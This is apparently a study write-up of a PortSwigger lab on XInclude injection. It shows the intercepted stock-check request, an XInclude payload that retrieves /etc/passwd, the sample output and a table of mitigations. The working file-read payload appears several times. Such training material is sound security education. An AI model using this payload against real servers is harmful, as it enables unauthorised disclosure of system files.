# Exploiting XInclude to Retrieve Files (PortSwigger Lab)

## Exploiting XInclude to Retrieve Files

### **Lab URL:**

[PortSwigger Lab: Exploiting XInclude to Retrieve Files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

***

### **High-Level Summary**

#### **Objective:**

Retrieve the contents of `/etc/passwd` using an **XInclude** attack.

#### **Key Techniques/Concepts:**

* **XInclude Injection:** Embedding an `XInclude` element to access sensitive files.
* **XML Parsing:** Bypassing traditional XXE constraints by leveraging `XInclude`.

#### **Key Learning:**

* Understanding how `XInclude` works as an alternative to XXE.
* Identifying different XML processing techniques in server-side parsing.

***

### **Lab Description**

This lab contains a **Check Stock** feature that embeds user input into a server-side XML document for processing. Since the entire XML document cannot be directly controlled, a traditional XXE attack is not feasible. Instead, an attacker must inject an `XInclude` statement to retrieve sensitive system files.

***

### **PortSwigger Solution**

1. **Generate Traffic:**
   * Visit a product page on the application.
   * Click **Check Stock** and intercept the request using Burp Suite.
2.  **Identify the Vulnerable Parameter:**

    * Locate the `POST` request to `/product/stock/`.
    * Identify the `productId` parameter in the request body:

    ```http
    POST /product/stock/ HTTP/1.1
    Host: target.com
    Content-Type: application/x-www-form-urlencoded

    productId=2&storeId=1
    ```
3.  **Craft the Payload:**

    * Replace the `productId` parameter with the following XInclude payload:

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```
4. **Send the Payload:**
   * Submit the modified request using Burp Suite's Repeater.
   * If successful, the contents of `/etc/passwd` will be returned in the response.

***

### **Instructor Solution**

1. **Reference Materials:**
   * The instructor referenced [PayloadAllTheThings - XInclude Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xinclude-attacks).
2. **Generate Traffic:**
   * Click "View details" on a product, then "View Stock" to generate traffic.
3.  **Identify Vulnerable Parameter:**

    * The vulnerable request was located in Burp Suite with the `POST` request to `/product/stock/`:

    ```http
    productId=2&storeId=1
    ```
4.  **Craft and Send Payload:**

    * The instructor replaced the `productId` with:

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```

    * Sent the payload, revealing the `/etc/passwd` file contents.

***

### **Step-by-Step Solution**

#### **1. Traffic Generation**

* Visit a product page and click **"View Stock"**.
* Intercept the `POST` request using Burp Suite.

```http
POST /product/stock/
Host: target.com
Content-Type: application/x-www-form-urlencoded

productId=2&storeId=1
```

***

#### **2. Payload Construction**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

* The payload injects an XInclude directive to retrieve the `/etc/passwd` file.

***

#### **3. Execution and Response**

* Submit the modified request in Burp Suite's Repeater.
* If successful, the response will return the file contents.

```plaintext
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
```

***

### **Why This Solution Works**

* `XInclude` allows external file inclusion even when a traditional XXE attack is restricted.
* The `parse="text"` parameter ensures the server treats the file content as plain text rather than attempting to parse it as XML.

***

### **XInclude Attack Summary**

#### **What is XInclude?**

XInclude (XML Inclusions) allows external resources (like files) to be included in an XML document using the `<xi:include>` tag.

#### **Key Components:**

1.  **Namespace Declaration (Required)**

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    ```

    * This **activates** the XInclude feature in XML.
    * The URL `"http://www.w3.org/2001/XInclude"` is **not a link** but a **label** for the XML parser to recognize XInclude functionality.
2.  **File Inclusion Payload:**

    ```xml
    <xi:include parse="text" href="file:///etc/passwd"/>
    ```

    * **`href`** specifies the file to retrieve (`/etc/passwd`).
    * **`parse="text"`** ensures the file content is returned as plain text.

***

### **Security Considerations & Mitigation Strategies**

#### **Why XInclude Can Be Dangerous**

* XInclude enables **local file inclusion** even if external entities (XXE) are disabled.
* Attackers can leverage this feature to retrieve sensitive system files.

#### **Mitigation Techniques**

| **Secure Practice**                              | **Insecure Practice**                        |
| ------------------------------------------------ | -------------------------------------------- |
| Disable XInclude processing in XML parsers       | Allow unrestricted XML processing            |
| Use strict input validation                      | Accept untrusted XML input                   |
| Implement secure XML libraries                   | Use legacy XML parsers with default settings |
| Restrict file system access for web applications | Allow full access to system directories      |

#### **Example: Secure XML Parsing in Python**

```python
import defusedxml.ElementTree as ET
ET.parse('data.xml')  # Secure parsing without external entities
```

***

### **Conclusion**

This lab demonstrates how **XInclude vulnerabilities** can be exploited to retrieve **sensitive system files**. By enforcing **secure XML processing**, restricting **file inclusions**, and validating **user input**, organizations can mitigate these risks effectively.
